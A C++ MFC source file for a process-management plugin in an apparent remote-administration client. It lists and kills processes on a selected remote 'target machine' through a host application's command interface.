#include "StdAfx.h"
#include "ProcessPlugin.h"
#include "ProcessForm.h"
#include "macro.h"
#include "conn.h"

conn lastS = 0;
conn currS = 0;

ProcessPlugin::ProcessPlugin()
{
	strcpy(m_plugInfo.sAuthor, "greatyao");
	strcpy(m_plugInfo.sName, "进程管理");
	strcpy(m_plugInfo.sDesc, "远程计算机任务管理器");
	m_plugInfo.uReserved = 0x0100;
}

ProcessPlugin::~ProcessPlugin()
{
}

void ProcessPlugin:: OnCreateDocTemplate()
{
	m_docTemp = new CMultiDocTemplate(
		GetMinResId() + 1,
		RUNTIME_CLASS(PluginDoc),
		RUNTIME_CLASS(CMDIChildWnd),
		RUNTIME_CLASS(ProcessForm));
	ISite::AddDocTemplate(m_docTemp);
}


void ProcessPlugin::OnCreateFrameMenu(CMenu* pMenu)
{
	pMenu->GetSubMenu(2)->AppendMenu(MF_STRING, GetMinResId() + 2, "进程管理");
}

void ProcessPlugin::OnCreateFrameToolBar(ToolBarData* pArr,UINT& count)
{
	pArr->uIconId = IDB_BITMAPPROCESS;
	pArr->uId = GetMinResId() + 2;
	strcpy(pArr->sName, "进程管理");	
	strcpy(pArr->sTip, "远程计算机任务管理器");	

	count = 1;
}

void ProcessPlugin::OnCommand(UINT uId)
{
	if (uId == GetMinResId() + 2)
	{
		ISite::CreateFrameWnd(m_docTemp, RUNTIME_CLASS(ProcessForm), "进程管理");
		
		if(lastS == 0 || lastS != currS)
		{
			ISite::SendCmd(CONTROL_ENUM_PROCS, currS, NULL, 0);
		}
	}
}

void ProcessPlugin::OnCreateDockPane(DockPane* pArr,UINT& count)
{	
	count = 0;
}

void ProcessPlugin::OnNotify(UINT id, WPARAM wp, LPARAM lp)
{
	if(wp == NULL)	return;
	
	ProcessForm* pView = NULL;
	POSITION posdoc = m_docTemp->GetFirstDocPosition();
	while(posdoc != NULL)
	{
		CDocument* pdoc = m_docTemp->GetNextDoc(posdoc);
		POSITION posview = pdoc->GetFirstViewPosition();
		pView = (ProcessForm*)(pdoc->GetNextView(posview));
	}

	if(id == ZCM_SEL_OBJ)//选择了新的目标机
	{
		STANDARDDATA* pSD = (STANDARDDATA*)wp;
		if(currS == pSD->s)	return;
		
		lastS = currS;
		currS = pSD->s;
		if( pView)
		{
			if(IsCurrentWorking())
				ISite::SendCmd(CONTROL_ENUM_PROCS, currS, NULL, 0);
		}
	}
	else if(IsCurrentWorking() == false)	//当前插件不在前端
		return;
	else if(id == ZCM_RECV_MSG)//收到目标机的发送回来的消息
	{
		DispatchData* data = (DispatchData*)wp;
		control_header* header = data->recvData.header;
		unsigned short cmd = header->command;
		if(cmd != CONTROL_ENUM_PROCS && cmd != CONTROL_KILL_PROCS)
			return;
		pView->ProcessData(wp);
	}
}

BOOL ProcessPlugin::OnInitalize()
{
	return TRUE;
}

BOOL ProcessPlugin::OnUninitalize()
{
	return TRUE;
}

void ProcessPlugin::OnCommandUI(CCmdUI* pCmdUI)
{

}


void ProcessPlugin::KillProcess(int pid)
{
	ISite::SendCmd(CONTROL_KILL_PROCS, currS, (char*)&pid, sizeof(pid));
}

